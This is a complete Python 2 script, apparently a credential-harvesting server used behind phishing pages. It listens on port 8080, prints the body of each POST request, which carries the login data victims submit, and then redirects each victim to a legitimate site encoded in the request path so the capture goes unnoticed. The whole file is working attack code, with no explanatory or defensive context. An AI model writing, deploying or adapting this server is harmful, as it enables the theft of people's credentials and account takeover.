import SimpleHTTPServer
import SocketServer
import urllib


class CredRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            creds = self.rfile.read(content_length).decode('utf-8')
            print creds

            site = self.path[4:]
            self.send_response(301)
            self.send_header('Location', urllib.unquote(site))
            self.end_headers()
        except:
            self.send_response(200, 'test')
            self.finish()

server = SocketServer.TCPServer(('0.0.0.0', 8080), CredRequestHandler)
server.serve_forever()

